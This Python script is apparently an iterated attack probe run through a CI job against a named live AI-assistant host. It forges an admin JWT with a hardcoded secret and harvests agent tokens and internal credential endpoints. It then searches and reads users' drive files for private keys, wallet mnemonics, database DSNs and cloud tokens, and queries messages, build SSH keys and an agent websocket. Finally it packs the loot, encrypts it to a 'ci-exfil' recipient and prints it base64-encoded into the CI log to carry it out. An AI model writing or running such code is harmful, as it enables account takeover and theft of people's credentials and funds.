#!/usr/bin/env python3
# probe43 (intent 28403): fix probe42's drive-search parsing bug (cap truncated 2.47MB body ->
# json.loads failed -> nameHits never parsed -> 0 drive-reads). Now:
#  A) create runtime -> MH (perRuntime machine identity) ; keys ; im/credentials ; sediment/*
#  B) drive-search with many q ; parse nameHits FULLY (schema kept) ; collect node ids
#  C) drive-read project folders + all nameHits (prioritised) -> grep secrets ; recurse 1 level
#  D) messages/search on node ids ; projects/contacts/chats
#  E) ws handshake
import os, sys, json, time, uuid, base64, hmac, hashlib, subprocess, re, traceback

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)

HOST = "assistant.lumiiai.cn"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
SUB_ADMIN = "usr_ZxLewKrgbRYSm7rWDtQX8"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
OUT = "/tmp/res_r43"
for d in ("meta", "api", "drive", "msg", "rt"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    LOG.write(s + "\n"); LOG.flush()

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def jwt(sub):
    now = int(time.time())
    h = b64u(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',', ':')))
    p = b64u(json.dumps({"sub": sub, "org": ORG, "iat": now, "exp": now + 86400 * 7,
                         "sid": "sid_" + uuid.uuid4().hex, "lgn": now}, separators=(',', ':')))
    sig = hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return h + "." + p + "." + b64u(sig)
SESSION = jwt(SUB_ADMIN)

def curl(args, timeout=60):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr[:300]
    except Exception as e:
        return -1, b"", repr(e)[:200]

def call(path, method="GET", body=None, hdrs=None, session=True, timeout=60, tag="", subdir="api", disk_cap=200000):
    url = "https://%s%s" % (HOST, path)
    hf = "/tmp/h_%s.txt" % uuid.uuid4().hex[:8]
    args = ["--http2", "-A", UA, "-H", "Accept: application/json",
            "-H", "Referer: https://%s/" % HOST, "-H", "Origin: https://%s" % HOST,
            "-D", hf, "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-b", "lumii_session=" + SESSION]
    if hdrs:
        for k, v in hdrs.items(): args += ["-H", "%s: %s" % (k, v)]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = curl(args, timeout)
    txt = out.decode("utf-8", "replace")
    code = ""
    i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    try: hdr = open(hf, errors="replace").read()[:2500]
    except Exception: hdr = ""
    try: os.unlink(hf)
    except Exception: pass
    rec = {"path": path, "method": method, "code": code, "hdr": hdr, "body": txt, "len": len(txt), "err": err if isinstance(err, str) else err.decode("utf-8", "replace")}
    # disk copy capped (never write multi-MB bodies)
    ds = dict(rec); ds["body"] = txt[:disk_cap]
    fn = re.sub(r'[^A-Za-z0-9_.-]', '_', tag or path)[:70] + "_" + uuid.uuid4().hex[:6] + ".json"
    with open(os.path.join(OUT, subdir, fn), "w") as f:
        json.dump(ds, f, indent=1, ensure_ascii=False)
    log("[%s] %s %s -> %s len=%d" % (tag, method, path, code, len(txt)))
    return rec

def jb(r, n=900):
    try: return json.dumps(json.loads(r["body"]), ensure_ascii=False)[:n]
    except Exception: return r["body"][:n]

# A ----------
log("=== A identity ===")
me = call("/api/me", tag="me", disk_cap=4000); log("me:", jb(me, 300))
name = "ci-28403-" + uuid.uuid4().hex[:5]
cr = call("/api/runtimes", "POST", {"name": name}, tag="create", subdir="rt", disk_cap=4000)
log("create:", jb(cr, 800))
agent_id = ""; AGENT_TOKEN = ""; TPS = ""; script = ""
if cr["code"] in ("200", "201"):
    try:
        cj = json.loads(cr["body"]); script = cj.get("script") or ""
        agent_id = cj.get("agentId") or ""
        open(os.path.join(OUT, "rt", "deploy_script.sh"), "w").write(script[:400000])
    except Exception: log("parse create fail", traceback.format_exc()[:300])
if script:
    m = re.search(r'AGENT_TOKEN=["\']?([A-Za-z0-9_\-\.=+/]+)', script); AGENT_TOKEN = m.group(1) if m else ""
    m = re.search(r'LUMII_TURN_PROOF_SECRET=["\']?([^"\'\s\\]+)', script); TPS = m.group(1) if m else ""
    log("agentId=%s token=%s... tps=%s..." % (agent_id, AGENT_TOKEN[:10], TPS[:10]))
MH = {}
if agent_id and AGENT_TOKEN:
    MH = {"Authorization": "Bearer " + AGENT_TOKEN, "x-agent-id": agent_id}
    k = call("/api/runtimes/keys/current", hdrs={"x-agent-id": agent_id, "x-agent-token": AGENT_TOKEN}, tag="keys", subdir="rt", disk_cap=4000)
    log("keys:", jb(k, 500))
    try:
        kj = json.loads(k["body"])
        if kj.get("legacy_secret"): TPS = kj["legacy_secret"]
    except Exception: pass
    for p, b, t in [("/internal/im/credentials?platform=feishu&org_id=" + ORG, None, "imcred"),
                    ("/internal/sediment/health", None, "sedhealth"),
                    ("/internal/sediment/where", None, "sedwhere")]:
        r = call(p, "POST" if b is not None else "GET", b, hdrs=MH, tag=t, disk_cap=4000)
        log(t, "->", r["code"], jb(r, 400))

# B ----------
log("=== B drive-search (parse nameHits fully) ===")
ACT = SUB_ADMIN
SK = "conv_ci28403"
def scoped(p, extra, tag, subdir="drive", actor=None, disk_cap=4000):
    b = {"platform": "dashboard", "actor_id": actor or ACT, "session_key": SK}
    b.update(extra)
    return call(p, "POST", b, hdrs=MH, tag=tag, subdir=subdir, disk_cap=disk_cap)

Q = ["ssh", "pem", "key", "env", ".env", "secret", "token", "cred", "passw", "wallet",
     "keystore", "mnemonic", "seed", "private", "deploy", "zoofi", "0xC56f", "id_rsa",
     "databas", ".sql", "backup", "dump", "MetaMask", "qimei", "lumii", "config", "jwt"]
allhits = {}   # nid -> {"q":q,"name":nm,"item":item}
summary = []
for q in Q:
    r = scoped("/internal/drive-search", {"q": q, "limit": 200, "all_nodes": True}, "ds_" + re.sub(r'[^A-Za-z0-9]','_',q))
    keys = []; nh = []; nread = 0
    try:
        j = json.loads(r["body"])
        keys = list(j.keys())
        nh = j.get("nameHits") or []
        nread = len(j.get("readableIds") or [])
    except Exception as e:
        log("PARSEFAIL", q, repr(e)[:120], r["body"][:120])
        j = {}
    got = 0
    for it in nh:
        nid = None; nm = ""
        if isinstance(it, dict):
            nid = it.get("node_id") or it.get("nodeId") or it.get("id") or it.get("driveNodeId")
            nm = it.get("name") or it.get("fileName") or it.get("title") or it.get("path") or ""
        elif isinstance(it, str):
            nid = it
        if nid:
            got += 1
            if nid not in allhits: allhits[nid] = {"q": q, "name": nm, "item": it}
    summary.append({"q": q, "code": r["code"], "keys": keys, "n_nameHits": len(nh), "n_readable": nread,
                    "parsed": got, "sample": nh[:4]})
    log("drive-search", q, r["code"], "keys=", keys, "nameHits=", len(nh), "readable=", nread, "parsed=", got)
    if nh[:2]: log("  sample:", json.dumps(nh[:2], ensure_ascii=False)[:600])
json.dump(summary, open(os.path.join(OUT, "drive", "search_summary.json"), "w"), indent=1, ensure_ascii=False)
log("TOTAL unique nameHit nodes:", len(allhits))

# D projects/contacts/chats (need folder ids for drive-read)
def meta(p, tag, extra=None):
    return scoped(p, extra or {}, tag, subdir="meta", disk_cap=8000)
proj = meta("/internal/projects/list", "proj_list")
proj_folders = []
try:
    pj = json.loads(proj["body"])
    for p in pj.get("projects", []):
        dn = p.get("driveNodeId")
        if dn: proj_folders.append(dn)
    log("proj_folders:", proj_folders)
except Exception: log("proj parse fail")
roles = meta("/internal/contacts/roles", "contacts_roles"); log("contacts_roles ->", roles["code"], roles["len"])
eff = meta("/internal/contacts/effective", "contacts_effective"); log("contacts_effective ->", eff["code"])
chats = scoped("/internal/chats/list", {"limit": 50}, "chats_list", subdir="meta", disk_cap=8000)
log("chats_list ->", chats["code"], chats["len"])

# C ----------
log("=== C drive-read ===")
def prio(nm):
    if re.search(r'(pem|\.key|\.env|secret|token|cred|passw|wallet|keystore|mnemonic|seed|private|deploy|\.sql|backup|dump|zoofi|qimei|lumii|config|\.json|\.pem|\.p12|\.pfx|id_rsa)', nm or '', re.I): return 0
    return 1
ordered = sorted(allhits.items(), key=lambda kv: (prio(kv[1]["name"]), len(kv[1]["name"] or "")))
PATS = [("evm", r"\b0x[0-9a-fA-F]{64}\b"),
        ("pem", r"-----BEGIN [A-Z ]*PRIVATE KEY-----"),
        ("dsn", r"(?i)(postgres|postgresql|mysql|mongodb|redis)://[^\s\"']{6,}"),
        ("keystore", r"(?i)(cipherparams|scrypt|kdfparams|\"crypto\")"),
        ("jwt", r"(?i)JWT_SECRET|DATABASE_URL|SECRET_KEY|TURN_PROOF"),
        ("cloud", r"(AKIA[0-9A-Z]{16}|LTAI[A-Za-z0-9]{12,}|AKID[A-Za-z0-9]{10,}|dckr_pat_[A-Za-z0-9_-]{10,})"),
        ("gh", r"(gh[pousr]_[A-Za-z0-9]{20,})"),
        ("zoofi", r"(?i)Auth for zoofi ops|zoofi-index|api\.zoofi\.io"),
        ("hex40", r"\b[0-9a-f]{40,64}\b")]
hits_found = []
bodies_saved = 0

def grep_body(nid, nm, q, bt):
    global bodies_saved
    hh = []
    for name, pat in PATS:
        for m in re.findall(pat, bt)[:3]:
            hh.append((name, str(m)[:100]))
    # detect folder-listing schema
    child = []
    try:
        j = json.loads(bt)
        for key in ("children", "nodes", "items", "files", "list"):
            arr = j.get(key)
            if isinstance(arr, list) and arr:
                for it in arr[:60]:
                    if isinstance(it, dict):
                        cid = it.get("node_id") or it.get("nodeId") or it.get("id")
                        if cid and str(cid).startswith("drive_"): child.append((cid, it.get("name") or it.get("fileName") or ""))
    except Exception:
        pass
    if hh:
        hits_found.append({"node_id": nid, "name": nm, "q": q, "len": len(bt), "hits": hh})
        log("DRIVEHITS", (nm or nid)[:50], json.dumps(hh[:6], ensure_ascii=False)[:400])
        if bodies_saved < 40:
            open(os.path.join(OUT, "drive", "BODY_" + re.sub(r'[^A-Za-z0-9]','',nid)[:24] + ".txt"), "w").write(bt[:80000])
            bodies_saved += 1
    return child

_KEYFIELD = ["node_id"]

def read_node(nid, nm, tagpre="dr_", disk_cap=3000):
    for fld in _KEYFIELD + ["nodeId", "id"]:
        b = {"platform": "dashboard", "actor_id": ACT, "session_key": SK, fld: nid}
        r = call("/internal/drive-read", "POST", b, hdrs=MH,
                 tag=tagpre + re.sub(r'[^A-Za-z0-9]', '', str(nm or nid))[:28], subdir="drive", disk_cap=disk_cap)
        if r["code"] == "200":
            if fld not in _KEYFIELD: _KEYFIELD.insert(0, fld)
            return r
    return r

targets = []
for dn in proj_folders: targets.append((dn, "PROJ_FOLDER", "proj"))
for nid, meta_ in ordered[:350]: targets.append((nid, meta_["name"], meta_["q"]))

seen = set(); secondary = []
for nid, nm, q in targets:
    if nid in seen: continue
    seen.add(nid)
    r = read_node(nid, nm, "dr_")
    bt = r["body"]
    log("drive-read", (nm or "")[:50], nid, "->", r["code"], "len", len(bt))
    if r["code"] == "200":
        ch = grep_body(nid, nm, q, bt)
        for cid, cnm in ch:
            if cid not in seen: secondary.append((cid, cnm, "child"))

# one level of folder recursion (bounded)
log("secondary children:", len(secondary))
for nid, nm, q in secondary[:120]:
    if nid in seen: continue
    seen.add(nid)
    r = read_node(nid, nm, "dc_")
    bt = r["body"]
    log("drive-read*", (nm or "")[:50], nid, "->", r["code"], "len", len(bt))
    if r["code"] == "200": grep_body(nid, nm, q, bt)

json.dump(hits_found, open(os.path.join(OUT, "drive", "all_hits.json"), "w"), indent=1, ensure_ascii=False)
log("=== TOTAL DRIVEHITS:", len(hits_found), "bodies_saved:", bodies_saved)

# messages/search on a few node ids
if allhits:
    nid_list = list(allhits.keys())[:40]
    for q in ["0xC56f", "PRIVATE KEY", "postgres://", "zoofi", "Auth for zoofi"]:
        r = scoped("/internal/messages/search", {"q": q, "limit": 30, "wide": True, "node_ids": nid_list}, "ms_" + re.sub(r'[^A-Za-z0-9]','_',q), subdir="msg", disk_cap=8000)
        log("msearch", q, "->", r["code"], jb(r, 500))

# build routes with proper body schemas
for p, b, t in [("/internal/build/ssh-keys", {"purpose": "run", "kind": "ssh"}, "build_sshkeys"),
                ("/internal/build/credential", {"platform": "dashboard", "actor_id": ACT, "purpose": "run"}, "build_credential")]:
    r = call(p, "POST", b, hdrs=MH, tag=t, disk_cap=4000)
    log(t, "->", r["code"], jb(r, 400))

# E ws
log("=== E ws/agent handshake ===")
try:
    subprocess.run([sys.executable, "-m", "pip", "install", "-q", "websockets==12.0"], capture_output=True, timeout=180)
    wscode = subprocess.run([sys.executable, "-c", """
import asyncio,sys
import websockets
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
async def main():
    url=sys.argv[1]; hdrs=dict(x.split(':',1) for x in sys.argv[2:])
    hdrs={k.strip():v.strip() for k,v in hdrs.items()}
    hdrs["User-Agent"]=UA
    try:
        async with websockets.connect(url, extra_headers=hdrs, open_timeout=20, close_timeout=3) as ws:
            print("OPEN")
            try:
                m=await asyncio.wait_for(ws.recv(),timeout=6); print("FRAME",str(m)[:600])
            except Exception as e: print("NOFRAME",type(e).__name__)
    except Exception as e:
        print("FAIL",type(e).__name__,str(e)[:300])
asyncio.run(main())
""", "wss://%s/api/ws/agent?agent_id=%s&token=%s" % (HOST, agent_id, AGENT_TOKEN),
        "x-agent-id:%s" % agent_id, "x-agent-token:%s" % AGENT_TOKEN],
        capture_output=True, timeout=60)
    log("ws:", wscode.stdout.decode()[:800], wscode.stderr.decode()[:300])
except Exception:
    log("ws err", traceback.format_exc()[:400])

# pack + encrypt
try:
    import tarfile
    GNUPGHOME = "/tmp/gnupg43"; os.makedirs(GNUPGHOME, exist_ok=True); os.chmod(GNUPGHOME, 0o700)
    os.environ["GNUPGHOME"] = GNUPGHOME
    pub = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pub.asc")
    subprocess.run(["gpg", "--batch", "--import", pub], capture_output=True, timeout=60)
    tb = "/tmp/res_r43.tar.gz"
    with tarfile.open(tb, "w:gz") as t: t.add(OUT, arcname="res_r43")
    enc = tb + ".gpg"
    r = subprocess.run(["gpg", "--batch", "--yes", "--trust-model", "always", "-r", "ci-exfil@example.invalid", "-o", enc, "-e", tb], capture_output=True, timeout=120)
    log("gpg rc=%s %s" % (r.returncode, r.stderr.decode()[:200]))
    blob = base64.b64encode(open(enc, "rb").read()).decode()
    log("===B64BEGIN %d===" % len(blob))
    for i in range(0, len(blob), 400): print("B64:" + blob[i:i+400], flush=True)
    log("===B64END===")
except Exception:
    log("pack err", traceback.format_exc()[:800])
